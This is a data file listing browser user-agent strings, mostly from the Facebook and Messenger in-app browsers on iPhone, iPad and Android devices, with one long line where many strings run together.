Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C101 [FBAN/MessengerForiOS;FBAV/196.0.0.54.99;FBBV/135382157;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1.2;FBSS/3;FBCR/CELCOM;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/VinaPhone;FBID/phone;FBLC/vi_VN;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/3;FBCR/TRUE-H;FBID/phone;FBLC/th_TH;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/190.1.0.58.95;FBBV/129822925;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/MessengerForiOS;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/pl_PL;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/193.0.0.49.98;FBBV/132029873;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/200.0.0.27.103;FBBV/139866222;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Telcel;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1;FBSS/3;FBCR/MetroPCS;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 [FBAN/MessengerForiOS;FBAV/191.0.0.54.98;FBBV/130377189;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.0;FBSS/2;FBCR/Free;FBID/phone;FBLC/fr_FR;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D39 [FBAN/MessengerForiOS;FBAV/201.0.0.47.100;FBBV/141000120;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.1.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/es_LA;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/111.0.0.15.46;]
Mozilla/5.0 (iPad; CPU OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.5;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5]
Mozilla/5.0 (Linux; Android 6.0.1; P01T_1 Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2704.81 Safari/537.36 [FB_IAB/MESSENGER;FBAV/119.0.0.18.91;]
Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5]
Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iOS;FBSV/13.2.3;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]
Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23 (Edition Yx) Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.72 Mobile Safari/537.36 OPR/55.2.2719.50740 Mozilla/5.0 (Linux; Android 10; ANG-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 9; ZB631KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36 Mozilla/5.0 (Linux; arm_64; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.115.00 SA/3 Mobile Safari/537.36 Mozilla/5.0 (Linux; arm_64; Android 10; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 11; SM-A205FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;] Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/290.0.0.44.121;] Mozilla/5.0 (Linux; Android 9; GS290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 Mozilla/5.0 (Linux; arm; Android 10; COL-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.101 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Home Assistant/2023.2 (io.robbie.HomeAssistant; build:2023.444; iPadOS 16.4.0) Mobile/HomeAssistant, like Safari Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1 Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15 [ip:90.231.5.114] Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPad12,1;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5] Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBIOS;FBDV/iPad11,7;FBMD/iPad;FBSN/iPadOS;FBSV/15.6;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5] Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPad8,9;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBID/tablet;FBLC/nl_NL;FBOP/5] Mozilla/5.0 (iPad; CPU OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/398.0.0.27.69;FBBV/450825020;FBDV/iPad7,6;FBMD/iPad;FBSN/iPadOS;FBSV/16.3.1;FBSS/2;FBCR/;FBID/tablet;FBLC/en-GB;FBOP/0] Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5] Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/404.0.0.32.69;FBBV/451012827;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/452362176] Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) WebKit/8614 (KHTML, like Gecko) Mobile/20B101 [FBAN/FBIOS;FBAV/329.0.0.45.119;FBBV/307086707;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/309406790] Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBIOS;FBAV/404.0.0.32.69;FBBV/451012827;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0]
Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; M2007J20CG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J17G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 6.0.1; D6543 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; SM-J730G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; moto g(7) play Build/QPYS30.52-22-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A315G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A037M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; moto e5 play Build/ODP27.91-167-9-19; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-J600GT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; moto g(100) Build/S1RTS32.41-20-16-1-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; ACK2326 Build/Kirk2_v1.1.8_BTM-ST; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 10; moto g(7) Build/QPUS30.52-16-2-13; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]
Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A125M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2101K7BG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 13; SM-A536E Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A225M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; ASUS_A001D Build/PPR1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; moto g(8) power lite Build/QODS30.163-17-29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A127M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; moto g52 Build/S1SRS32.38-132-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/344.0.0.10.83;]
Mozilla/5.0 (Linux; Android 7.0; SM-A510M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; LM-X420 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-X430 Build/QKQ1.200730.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; Lenovo TB-X606X Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; moto g(8) power lite Build/POD29.348-23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; moto g(10) Build/RRBS31.Q1-3-48-20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A526B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/344.0.0.10.83;]
Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A226BR Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; SM-G611MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 6.0; CAM-L21 Build/HUAWEICAM-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; SM-A205G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 11; 2109119DG Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]
Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 8.1.0; SM-J710MN Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]
Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; LM-Q730 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-14-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]
Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 12; SM-A025M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/404.0.0.35.70;]
Mozilla/5.0 (Linux; Android 10; SM-A105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]
